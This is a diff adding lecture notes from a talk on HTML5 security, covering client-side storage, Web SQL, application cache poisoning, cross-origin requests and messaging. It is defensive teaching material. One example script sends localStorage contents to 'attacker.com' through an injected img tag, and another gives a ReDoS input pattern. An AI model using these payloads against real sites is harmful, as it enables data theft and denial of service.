@@ -1,0 +1,203 @@
+Ming Y Chow - HTML5 Security
+http://www.eecs.tufts.edu/~mchow/
+@tufts_cs_mchow on twitter
+
+background - game software, security software
+Tufts University - Department of Computer Science
+
+Intro:
+
+I would like to talk to you today about HTML5. It has been gaining a lot of traction. It also presents some interesting challenges and new quirks.
+
+HTML5 is a very stack. The standard from the W3C is still evolving. Some things may change in a year or two; but we need to examine it now, as it is already in use now.
+
+At the end of the day, the theme is to be diligent.
+
+What is HTML5?
+
+* The next major version of HTML. Replacement of XHTML? Yes.
+* Close enough to a full-fledged development environment.
+* Originally coined as Web Applications 1.0
+* Three Aspects:
+  - Content (HTML)
+  - Presentation (CSS)
+  - Interaction (Javascript)
+* Still a work in progress.
+* Backing from Google and of course Apple.
+  - REF: See html5rocks
+* Currently supported (not 100%) in Chrome, FF 3.5+, Opera, and Safari
+* Many incompatibilities exist; perform a browser test via http://html5test.com
+* Will be flexible with error handling (i.e. older syntax) Older browsers will safely ignore the new HTML5 syntax.
+
+HTML5 What's in What's out?
+
+*** IN
+
+New tags, <button> <video> <audio> <article> <footer> <nav>
+new attributes for tags such as autocomplete, autofocus, form, pattern (regex!) for input
+new media events
+new Canvas tag for 2D rendering
+new form controls for date and time
+geolocation
+new selectors
+client-side storage including localstorage, sessionstorage, and web SQL
+
+*** OUT
+
+* presentation elements such as FONT, CENTER
+* presentation attributes such as ALIGN, BORDERody>
+
+* FRAME, FRAMESET
+* APPLET
+* old special effects: MARQUEE, BGSOUND
+* NOSCRIPT
+
+*** Demos
+
+The arcade fire's the wilderness
+http://www.thewildernessdowntown.com/
+
+Video Captioning (a lab in Ming's Web Programming Class at Tufts CS)
+http://www.eecs.tufts.edu/~apelle03/comp20/lab2
+
+Find Carmen Sandiego via geolocation and Google Maps
+http://www.eecs.tufts.edu/comp/20/lectures/lab3_solution.html
+
+Structure of an HTML5 Documentation
+<!DOCTYPE html>
+<html>
+<head>
+<title>an HTML Document</title>
+...
+...
+...
+</head>
+<body>
+<p>Everything you know is much the same.</p>
+</body>
+</html>
+
+AREAS OF CONCERN
+
+* The attack surface: client-side
+* Client-side and offline storage
+  - No longer just cookies and sessions
+  - Compared to cookies and sessions, allows for greater amount of data to be stored
+  - What if a client's DB synchronizes with production on server, and client's db contains malicious data?
+* Cross-Origin JavaScript requests
+  - Traditionally, the AJAX model was Same-Origin. Now, you can make cross-origin requests. The script or file doesn't have to be on your server or folder.
+* The complexity of HTML5 making the browser worse
+  - Vulnerabilities have already been found in Opera's Canvas element.
+* Important Note: the HTML5 standard is a work-in-progress, being finalized.
+
+localStorage and sessionStorage
+* provides key-value mappings (string to string mapping)
+* very much like cookies. one difference: size limit. Cookies => 4kb. localStorage => depends on browser (MB, generally)
+* differences
+  - sessionStorage data confined to browser window that it was created in, lasts until browser is closed
+  - localStorage has longer persistence, can last even after browser is closed
+* Trivial to use
+  - (localStorage | sessionStorage).setItem()
+  - (localStorage | sessionStorage).getItem()
+  - (localStorage | sessionStorage).deleteItem()
+
+Hardly any security with localStorage or sessionStorage
+* If you have an XSS vulnerability in your application, your storage is vulnerable!
+* Example: <script>document.write("<img src='http://attacker.com?cookie=" + localStorage.getItem('phrase') + "'>");<script>
+* Never a good idea to use local storage for sensitive data
+
+Web SQL
+* Brings SQL to the client-side
+  - not new: see google gears
+* Core methods
+  - openDatabase("DB NAME", "DB VERSION" "DB DESC", "EST SIZE");
+  - transaction("YOUR SQL HERE");
+  - 
+* prepared statements supported!
+  - Fights back against SQL injection, using ? binding syntax
+  - INSERT INTO thoughts (date_key, phrase, handle) VALUES (?, ?, ?)
+* the usual gang of attacks XSS, SQL Injection
+* need to sanitize inputs/outputs!
+  - REF: http://stackoverflow.com/questions/784586 "Convert special characters in HTML in Javascript"
+* the usual gang of preventions
+  - use prepared statements
+  - output encoding
+* new wrenches
+  - do not store sensitive data in client-side database
+  - like localstorage and sessionStorage, someone with access to your machine can read everything
+  - can you really trust what is stored on client-side database?
+  - create database and store data over SSL
+  - ask user for permission before creating and storing local database
+
+Q: If you use a prepared statement, what engine handles the tokenization?
+A: All done in the browser. This is all client-side; no server-side involvement at all.
+
+*** Application Cache
+* useful for offline browsing, speed, reduce server load
+* the size limit for cached data for a site: 5mb
+* enabling application cache
+  <html manifest="example.manifest">
+  </html>
+* the manifest file (example.manifest):
+  CACHE MANIFEST
+  # 2010-06-18:v2
+  # Explicitly cached entries
+  CACHE:
+  index.html
+  stylesheet.css
+  images/logo.png
+  script/main.js
+* example: updating application cache
+  applicationCache.addEventListener('checking', updateCacheStatus, false);
+  
+Q: Is there a sandbox mechanism that prevents me from accessing a local database from my own server?
+A: Yes, but this requires further research.
+
+*** poisoning the application cache
+* any website can create a cache on the user's computer
+* no permission required before allowing a site to create an application cache in chrome or safari
+* any file can be cached, including a root file "/"
+* the catch: even if a root resource is cached normally and on refresh, the normal cache is updated but not the application cache
+* read: http://blog.andlabs.com/2010/06/ ...
+
+*** Cross-Origin JavaScript Requests
+* not directly part of html5 but introduced by W3C
+* XDomainRequest() created by MSFT in IE8
+* in some cases, XMLHttpRequest() now allows cross-domain requests
+* Caveat: consent between web page and the server is required
+  - server must respond with an access-control-allow-origin header of either * or the exact URL of the requesting page (site-level; white-list)
+  - Do not set to:
+    Access-Control-Allow-Origin: *
+* Resolutions
+  - use PHP's $_SERVER['HTTP_ORIGIN'] is god but not foolproof
+  - Add some form of auth/credentials checking (e.g. cookie)
+  - Validate Response
+
+*** Cross-Document Messaging
+
+* Establish a communication channel between frames in different origins
+  - window.postMessage("message", "targetOrigin");
+* Watch out, if you are the receiver of a message from another site, always verify the sender's identity using the origin property!
+
+*** But what about the new Tags and Attrs?
+
+* Depends on browser, spec of codec, format
+* native audio/video rendering. What if there are flaws in the codec?
+* On some browsers, you can embed javascript as the value of the onerror attribute with <source>
+* heap buffer overflow via transformations and painting in html5 canvas in opera
+  - http://www.opera.com/support/kb/view/966/ (now fixed)
+* what if an inline SVG call contains Javascript and HTML?
+* Potential Client-side ReDoS via pattern attribute in input (Opera 10+)
+  - Example: <input pattern="^((a+.)a)+$" value="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..." />
+  - More Details: http://forum.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS
+
+*** Summary
+
+* A lot of the same old problems, same old resolutions
+- read: common sense
+input validation
+be careful connecting to an unsecured network / public wifi
+important to remember: html5 sandard is still work-in-progress, being finalized, evolving
+but at the same time, the spike of iOS, Android, and other mobiles that do not support Flash has spurred growth and development in HTML5.
+
+*** My Notes: What about clipboard access?
